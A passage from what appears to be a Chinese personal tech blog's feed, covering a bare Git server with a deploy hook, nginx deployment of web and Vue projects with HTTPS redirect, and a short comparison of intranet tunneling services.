<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">mkdir</span> gitRepo</span><br><span class="line">$ <span class="built_in">chown</span> git:git gitRepo</span><br><span class="line">$ <span class="built_in">cd</span> gitRepo</span><br><span class="line">$ git init --bare demo.git</span><br><span class="line">Initialized empty Git repository <span class="keyword">in</span> /home/gitrepo/demo.git/</span><br></pre></td></tr></table></figure>

<p>创建一个空仓库，服务器上的 Git 仓库通常都以<code>.git</code>结尾，把仓库所属用户改为 git</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chown</span> -R git:git demo.git</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Tips</p>
<p>使用<code>git init --bare &lt;repo&gt;</code>可以创建一个裸仓库，并且这个仓库是可以被正常 clone 和 push 的，裸仓库不包含工作区，所以不能在裸仓库上直接提交变更。</p>
</blockquote>
<h2 id="同步到指定的目录"><a href="#同步到指定的目录" class="headerlink" title="同步到指定的目录"></a>同步到指定的目录</h2><p>使用钩子函数，在文件提交到仓库时，同步到指定的目录。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/gitRepo/demo.git/hooks</span><br><span class="line">$ <span class="built_in">touch</span> post-receive</span><br><span class="line">$ <span class="built_in">chown</span> -R git:git post-receive</span><br><span class="line">$ <span class="built_in">chmod</span> +x post-receive</span><br><span class="line">$ vim post-receive</span><br></pre></td></tr></table></figure>

<p>post-receive 文件内容为</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 文件提交到仓库时，同步到指定的目录</span></span><br><span class="line">DIR=/home/www/demo</span><br><span class="line">git --work-tree=<span class="variable">$&#123;DIR&#125;</span> clean -fd</span><br><span class="line"><span class="comment">#直接强制检出</span></span><br><span class="line">git --work-tree=<span class="variable">$&#123;DIR&#125;</span> checkout --force</span><br></pre></td></tr></table></figure>

<p>创建目录 demo，添加到 git 用户组</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> /home/www/demo</span><br><span class="line">$ <span class="built_in">chown</span> -R git:git /home/www/demo</span><br></pre></td></tr></table></figure>

<h2 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@192.168.1.6:/home/gitRepo/demo.git</span><br><span class="line">Cloning into <span class="string">&#x27;demo&#x27;</span>...</span><br><span class="line">warning: You appear to have cloned an empty repository.</span><br><span class="line">Checking connectivity... <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<p><strong><a href="mailto:&#103;&#x69;&#x74;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#x2e;&#x36;">&#103;&#x69;&#x74;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#x2e;&#x36;</a></strong>：192.168.1.6 为 Git 所在服务器 ip ，你需要将其修改为你自己的 Git 服务 ip。</p>
<p><strong>前缀 git</strong>为添加的用户。</p>
<p>这里，因为没有提前创建证书登录，所以需要输入上面设置好的 git 用户密码。</p>
<h2 id="创建证书登录"><a href="#创建证书登录" class="headerlink" title="创建证书登录"></a>创建证书登录</h2><p>收集所有需要登录的用户的公钥，公钥位于 id_rsa.pub 文件中（如果本地是 Windows 系统，一般在 C 盘用户下的.ssh 目录中），把我们的公钥导入到&#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorized_keys 文件里，一行一个。</p>
<p>如果没有该文件创建它</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/git/</span><br><span class="line">$ <span class="built_in">mkdir</span> .ssh</span><br><span class="line">$ <span class="built_in">chmod</span> 755 .ssh</span><br><span class="line">$ <span class="built_in">touch</span> .ssh/authorized_keys</span><br><span class="line">$ <span class="built_in">chmod</span> 644 .ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://git-scm.com/book/zh/v2/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BA-Git">服务器上的 Git - 在服务器上搭建 Git</a></p>
<p>[2] <a href="https://www.jianshu.com/p/5b7ff91c5338">git init 与 git init –bare</a></p>
<p>[3] <a href="https://www.runoob.com/git/git-server.html">Git 服务器搭建</a></p>
<p>[4] <a href="https://www.runoob.com/linux/linux-command-manual.html">Linux 命令大全</a></p>
<p>[5] <a href="https://blog.csdn.net/weixin_44191814/article/details/120091363">Linux 命令大全(超详细版)</a></p>
<p>[6] <a href="https://www.jianshu.com/p/5b7ff91c5338">git init 与 git init –bare</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>云服务器使用nginx部署web项目</title>
    <url>/2022/08/27/20220827-%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8nginx%E9%83%A8%E7%BD%B2web%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>nginx 是一个很强大的高性能<a href="https://baike.baidu.com/item/Web/150564">Web</a>和<a href="https://baike.baidu.com/item/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">反向代理</a>服务。</p>
<p><img src="https://cdn.huatree.top/image-20220828015532132.png" alt="image-20220828015532132"></p>
<span id="more"></span>

<div class="note primary"><p>本文以百度智能云服务器<code>debian</code>为例，<code>root</code>角色进行操作。非 root 角色，需要<code>sudo &lt;命令&gt;</code>，回车，输入当前用户密码即可执行。</p>
</div>

<h2 id="安装-nginx"><a href="#安装-nginx" class="headerlink" title="安装 nginx"></a>安装 nginx</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出所有可更新的软件清单命令</span></span><br><span class="line">$ apt update</span><br><span class="line"><span class="comment"># 升级软件包</span></span><br><span class="line">$ apt upgrade</span><br><span class="line"><span class="comment"># 安装nginx</span></span><br><span class="line">$ apt install nginx</span><br><span class="line"><span class="comment"># 查下版本，确认安装成功</span></span><br><span class="line">$ nginx -v</span><br><span class="line">nginx version: nginx/1.10.3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Tips</p>
<p>nginx 版本不同，目录可能存在一些差异</p>
</blockquote>
<h2 id="nginx-目录"><a href="#nginx-目录" class="headerlink" title="nginx 目录"></a>nginx 目录</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ whereis nginx</span><br><span class="line">$ <span class="built_in">cd</span> /etc/nginx</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">conf.d  fastcgi_params  koi-win  modules-available  nginx.conf    scgi_params   sites-enabled  uwsgi_params</span><br><span class="line">fastcgi.conf  koi-utf     mime.types  modules-enabled    proxy_params  sites-available  snippets   win-utf</span><br></pre></td></tr></table></figure>

<p>其中，<code>/etc/nginx/nginx.conf</code>为主配置文件，<code>sites-avaiable</code>主要用户配置 server 端。</p>
<p>执行文件：<code>/usr/sbin/nginx</code></p>
<p>web 目录：<code>/var/www</code></p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止nginx</span></span><br><span class="line">$ /etc/init.d/nginx stop</span><br><span class="line"><span class="comment"># 启动nginx</span></span><br><span class="line">$ /etc/init.d/nginx start</span><br><span class="line"><span class="comment"># 服务状态</span></span><br><span class="line">$ /etc/init.d/nginx status</span><br><span class="line"><span class="comment"># 重新载入配置文件</span></span><br><span class="line">$ /etc/init.d/nginx reload</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">$ /etc/init.d/nginx restart</span><br></pre></td></tr></table></figure>

<p>service 命令管理 nginx 服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">$ service nginx start</span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">$ service nginx stop</span><br><span class="line"><span class="comment"># 服务状态</span></span><br><span class="line">$ service nginx status</span><br><span class="line"><span class="comment"># 重载</span></span><br><span class="line">$ service nginx reload</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">$ service nginx restart</span><br></pre></td></tr></table></figure>

<p>systemctl 命令管理 nginx 服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出所有 service 单元配置</span></span><br><span class="line">$ systemctl list-units --<span class="built_in">type</span>=service</span><br><span class="line"><span class="comment"># 查看nginx服务状态</span></span><br><span class="line">$ systemctl status nginx</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试配置文件</span></span><br><span class="line">$ nginx -t</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Tips</p>
<p>systemctl 命令是系统服务管理器指令，它实际上将 service 和 chkconfig 这两个命令组合到一起。</p>
</blockquote>
<h2 id="web-目录与-sites-enabled"><a href="#web-目录与-sites-enabled" class="headerlink" title="web 目录与 sites-enabled"></a>web 目录与 sites-enabled</h2><p>前面我们提到 web 存放目录是：&#x2F;var&#x2F;www，里面默认有一个 html 目录，在我们安装完 nginx 时直接再浏览器输入 ip 或域名，默认会到 80 端口，并展示一个 welcom to nginx 的界面，就是来自于&#x2F;var&#x2F;www&#x2F;html&#x2F;index.nginx-debian.html 这个文件。为什么会默认到这个文件，是在哪里配置的呢，打开&#x2F;etc&#x2F;nginx&#x2F;nginx.conf 主配置文件会发现在 http 内有这么一句代码：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">include</span> /etc/nginx/conf.d/<span class="regexp">*.conf</span>;</span><br><span class="line"><span class="attribute">include</span> /etc/nginx/sites-enabled/*;</span><br></pre></td></tr></table></figure>

<p>如果所有 server 配置都写在 nginx.conf 主配置文件中，难免会显得杂乱与臃肿。为了方便配置文件的维护，所以需要进行拆分配置，将低耦合高内聚贯彻到底。</p>
<p><code>include /etc/nginx/sites-enabled/</code> 的作用就是引入<code>/etc/nginx/sites-available/</code>下的所有 server 文件（有一个默认的<code>default</code>文件），其实 sites-enabled 下是 server 配置文件的<strong>软链接</strong>。而实际配置其实是在<code>/etc/nginx/sites-available/</code>下。</p>
<h2 id="sites-available-中自定义文件并部署项目"><a href="#sites-available-中自定义文件并部署项目" class="headerlink" title="sites-available 中自定义文件并部署项目"></a>sites-available 中自定义文件并部署项目</h2><p>如果我们要在 web7000 这个目录下部署多个 web 项目，web1,web2。让浏览器访问 localhost:7000&#x2F;web1 时响应 web1 的项目，访问 localhost:7000&#x2F;web2 时响应 web2 的项目。</p>
<p>切换到<code>/etc/nginx/sites-available</code>目录下，<code>ls</code>查看当前目录的配置，默认是有一个<strong>default 案例</strong>。将 default 复制一份，并起名为任意名字以.conf 结尾的文件，<strong>注意命名不要使用下划线符号<code>_</code>连接的方式，这可能导致文件执行无效。</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /etc/nginx</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">cd</span>  sites-available</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">cp</span> default web7000.conf</span><br><span class="line">$ vim web7000.conf</span><br></pre></td></tr></table></figure>

<p>web7000.conf 文件配置如下：</p>
<p><code>http://www.hautree.top</code>指向<code>http://ip:7000</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line">  <span class="attribute">server_name</span> www.hautree.top</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">    	<span class="attribute">proxy_pass</span> http://localhost:7000;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">7000</span>;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">7000</span>;</span><br><span class="line">  <span class="attribute">server_name</span> localhost;</span><br><span class="line">  <span class="comment"># 静态资源路径</span></span><br><span class="line">  <span class="attribute">root</span> /var/www/web7000;</span><br><span class="line">  <span class="comment"># 入口文件-首页</span></span><br><span class="line">  <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">    <span class="comment"># root /var/www/web7000;</span></span><br><span class="line">    <span class="comment"># index index.html;</span></span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来保存退出，在 sites-enabled 目录下创建软连接</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /etc/nginx/sites-enabled</span><br><span class="line">$ <span class="built_in">ln</span> -s /etc/nginx/sites-available/web7000.conf</span><br></pre></td></tr></table></figure>

<p>然后再重启 nginx，让配置生效</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 优雅地重启nginx</span></span><br><span class="line"><span class="comment"># 如果要在更改配置后刷新nginx，最好最好重新加载服务。这将关闭旧进程，并使用新配置重新启动新进程。</span></span><br><span class="line">$ systemctl reload nginx</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$ /etc/init.d/nginx reload</span><br><span class="line"><span class="comment"># 强制重启Nginx</span></span><br><span class="line"><span class="comment"># 对于主要配置更改，可以强制完全重新启动nginx。这将强制关闭整个服务和子流程，然后重新启动整个程序包。</span></span><br><span class="line">$ systemctl restart nginx</span><br></pre></td></tr></table></figure>

<p>在浏览器中输入<code>www.hautree.top</code>，则会显示我们放在&#x2F;var&#x2F;www&#x2F;web7000 下的 index.html 文件。这样就完成了一个基本的 web 项目部署。</p>
<h2 id="一个端口下部署多个项目"><a href="#一个端口下部署多个项目" class="headerlink" title="一个端口下部署多个项目"></a>一个端口下部署多个项目</h2><p>以上操作我们只能在 7000 端口下,&#x2F;var&#x2F;www&#x2F;web7000 目录下部署一个项目，如果要部署多个项目又该如何实现呢？例如浏览器输入 ip:7000&#x2F;web1 显示项目 web1,输入 ip:7000&#x2F;web2 显示项目 web2，我们的&#x2F;var&#x2F;www&#x2F;web7000 目录结构是这样</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">+-- web7000</span><br><span class="line">  +-- web2</span><br><span class="line">  +-- web1</span><br></pre></td></tr></table></figure>

<p>更改<code>/etc/nginx/sites-available/web7000.conf</code>文件为：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line">  <span class="attribute">server_name</span> www.hautree.top</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">      <span class="attribute">proxy_pass</span> http://localhost:7000;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">7000</span>;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">7000</span>;</span><br><span class="line">  <span class="attribute">server_name</span> localhost;</span><br><span class="line">  <span class="comment"># 静态资源路径</span></span><br><span class="line">  <span class="attribute">root</span> /var/www/web7000;</span><br><span class="line">  <span class="comment"># 入口文件-首页</span></span><br><span class="line">  <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> /web2 &#123;</span><br><span class="line">    <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="section">location</span> /web1 &#123;</span><br><span class="line">    <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>location &#x3D; &#x2F;web1</strong>表示浏览器输入<code>www.huatree.top/web1</code>进入此规则，location &#x3D; web2 同理。</p>
<p><code>try_files $uri $uri/ =404</code>存在优先级，首先找 u r i 是 否 存 在 ， 不 存 在 响 应 404。</p>
<p><code>uri</code>又代表什么意思呢，浏览器输入<code>www.huatree.top/web2</code>， $uri 代表的就是&#x2F;web2 文件，注意是<strong>web2 文件</strong>（不是指目录）。</p>
<p><code>$uri/</code>代表的是**&#x2F;web2 目录**，如果存在则会结合 root 去找&#x2F;var&#x2F;www&#x2F;web7000&#x2F;web2 下的 index.html 并响应。</p>
<p>所以我们做了以上配置会发现浏览器中输入<code>www.huatree.top/web1</code>响应 404，输入<code>www.huatree.top/web2</code>才会响应对应 web2 项目下的 html 文件。</p>
<p>那是不是 try_files $uri 就没啥用了呢？</p>
<p>我们在浏览器端输入 ip:7000&#x2F;web1&#x2F;index.html 时， $uri 解析成了 web1&#x2F;index.html，所以这样时能访问的，利用这个特性，我们还可以访问 web1 下的其他资源，比如有一张 test.png 图片，则可 ip:7000&#x2F;web1&#x2F;test.png。</p>
<h2 id="一个端口下部署多个-Vue-项目"><a href="#一个端口下部署多个-Vue-项目" class="headerlink" title="一个端口下部署多个 Vue 项目"></a>一个端口下部署多个 Vue 项目</h2><p>场景：需要解决 CORS，接口地址通过 nginx 代理</p>
<h3 id="配置-vue-文件"><a href="#配置-vue-文件" class="headerlink" title="配置 vue 文件"></a>配置 vue 文件</h3><p>vue.config.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">publicPath</span>: <span class="string">&#x27;/web3&#x27;</span>, <span class="comment">// web4 ...</span></span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://api.xxx.top&#x27;</span>, <span class="comment">// 接口地址</span></span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>router&#x2F;index.ts</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routerHistory = <span class="title function_">createWebHistory</span>(<span class="string">&#x27;/web3&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>: routerHistory,</span><br><span class="line">  <span class="attr">routes</span>:constantRoutes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打包</p>
<p>将打包生成的 dist 中的文件拷贝到&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;h5.conf 中规定好的目录下</p>
<h3 id="配置-h5-conf"><a href="#配置-h5-conf" class="headerlink" title="配置 h5.conf"></a>配置 h5.conf</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> /etc/nginx/sites-available/default /etc/nginx/sites-available/h5.conf</span><br><span class="line">$ vim /etc/nginx/sites-available/h5.conf</span><br></pre></td></tr></table></figure>

<p>编辑 h5.conf 关键内容</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">server_name</span> h5.huatree.top;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:7001;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">7001</span>;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">7001</span>;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">server_name</span> localhost;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">root</span> /home/www/subapp;</span><br><span class="line">  <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> /web3 &#123;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment"># location /web4 &#123;</span></span><br><span class="line">  <span class="comment">#   try_files $uri $uri/ =404;</span></span><br><span class="line">  <span class="comment"># &#125;</span></span><br><span class="line">  <span class="section">location</span> /api &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://api.xxx.top/api;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment"># location /api2 &#123;</span></span><br><span class="line">  <span class="comment">#   proxy_pass http://api.xxx.top/api2;</span></span><br><span class="line">  <span class="comment"># &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="nginx-配置并默认跳转到-https"><a href="#nginx-配置并默认跳转到-https" class="headerlink" title="nginx 配置并默认跳转到 https"></a>nginx 配置并默认跳转到 https</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /etc/nginx/sites-available</span><br><span class="line">$ <span class="built_in">cp</span> default reverse-proxy.conf</span><br><span class="line">$ vim reverse-proxy.conf</span><br></pre></td></tr></table></figure>

<p>reverse-proxy.conf</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">443</span> ssl;</span><br><span class="line">  <span class="comment"># 日志</span></span><br><span class="line">  <span class="attribute">access_log</span> /var/log/nginx/reverse-access.log;</span><br><span class="line">  <span class="attribute">error_log</span> /var/log/nginx/reverse-<span class="literal">error</span>.log;</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 启用ssl功能（最新版本不需要配置，默认开启）</span></span><br><span class="line">  <span class="attribute">ssl</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 证书</span></span><br><span class="line">  <span class="attribute">ssl_certificate</span> /home/huatree/certs/huatree.top_bundle.pem;</span><br><span class="line">  <span class="attribute">ssl_certificate_key</span> /home/huatree/certs/huatree.top.key;</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 会话、协议等</span></span><br><span class="line">  <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;</span><br><span class="line">  <span class="attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">  <span class="attribute">ssl_session_timeout</span> <span class="number">10m</span>;</span><br><span class="line">  <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:7000;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>证书</strong>：这里的证书，可以去域名提供商那儿，申请免费的安全证书。了解更多，可详见<em>参考 6,7</em>，申请下载配置使用。</p>
<p>这里以一个端口下部署的单个项目为例，更改<code>/etc/nginx/sites-available/web7000.conf</code>文件为：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line">  <span class="attribute">server_name</span> www.hautree.top</span><br><span class="line">  <span class="comment"># 重写</span></span><br><span class="line">  rewrite<span class="regexp"> ^(.*)</span> https://www.huatree.top <span class="literal">permanent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:7000;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">7000</span>;</span><br><span class="line">  <span class="attribute">listen</span> [::]:<span class="number">7000</span>;</span><br><span class="line">  <span class="attribute">server_name</span> localhost;</span><br><span class="line">  <span class="comment"># 静态资源路径</span></span><br><span class="line">  <span class="attribute">root</span> /var/www/web7000;</span><br><span class="line">  <span class="comment"># 入口文件-首页</span></span><br><span class="line">  <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">    <span class="comment"># root /var/www/web7000;</span></span><br><span class="line">    <span class="comment"># index index.html;</span></span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，让配置生效</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查配置是否正常</span></span><br><span class="line">$ nginx -t</span><br><span class="line"><span class="comment"># 重载</span></span><br><span class="line">$ systemctl reload nginx</span><br><span class="line"><span class="comment"># 或者重启</span></span><br><span class="line">$ systemctl restart nginx</span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.debian.org/doc/manuals/debian-reference/ch03.zh-cn.html#_system_management_operations">debian &gt; 系统管理</a></p>
<p>[2] <a href="https://blog.csdn.net/weixin_34211761/article/details/91658441">Linux 下 systemctl 命令和 service、chkconfig 命令的区别</a></p>
<p>[3] <a href="https://blog.csdn.net/cygdxcw/article/details/119988073">云服务器使用 nginx 部署 web 项目(ubuntu 操作系统)</a></p>
<p>[4] <a href="https://www.cnblogs.com/jedi1995/p/10900224.html">nginx 配置选项 try_files 详解</a></p>
<p>[5] <a href="https://pangruitao.com/post/2106">Debian 下用 Nginx 反向代理 http 为 https</a></p>
<p>[6] <a href="https://www.freesion.com/article/3461470003/">DEBIAN8 NGINX 添加阿里云 SSL 证书，配置 HTTPS</a></p>
<p>[7] <a href="https://blog.csdn.net/qq_38667427/article/details/125414631">Nginx|Tomcat 配置 https</a></p>
<p>[8] <a href="https://www.cnblogs.com/beheTea/p/16261345.html">nginx 一个端口部署多个 vue 项目</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>部署</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透软件</title>
    <url>/2022/08/27/20220827-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<p>这里总有一款适合你的内网穿透软件。</p>
<p><img src="https://cdn.huatree.top/image-20220827130407143.png" alt="image-20220827130407143"></p>
<span id="more"></span>

<h2 id="花生壳"><a href="#花生壳" class="headerlink" title="花生壳"></a>花生壳</h2><p><a href="https://hsk.oray.com/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827133856889.png" alt="image-20220827133856889"></p>
<p><strong>简评</strong>:</p>
<p><strong>花生壳</strong>应该算是业界大佬，平常大家使用的<strong>向日葵远程控制软件</strong>就是该公司的产品</p>
<ul>
<li>优点：信誉保障，教程完善，界面美观，有免费套餐两条映射，<strong>支持在网站查看远程端口</strong></li>
<li>缺点：免费套餐<strong>限流量</strong>，需要实名认证，支持架构少</li>
</ul>
<h2 id="cpolar"><a href="#cpolar" class="headerlink" title="cpolar"></a>cpolar</h2><p><a href="www.cpolar.com/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827134111356.png" alt="image-20220827134111356"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点： 有免费套餐，<strong>不限流量</strong>，不需要手机号注册，支持架构多，使用简单，界面简洁，<strong>支持在网站查看远程端口</strong></li>
<li>缺点：网站指引不太明确</li>
</ul>
<h2 id="natapp"><a href="#natapp" class="headerlink" title="natapp"></a>natapp</h2><p><a href="https://natapp.cn/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827134347541.png" alt="image-20220827134347541"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点：界面简洁，有免费套餐，<strong>不限流量</strong>，支持架构多，文档完整</li>
<li>缺点：需要实名认证</li>
</ul>
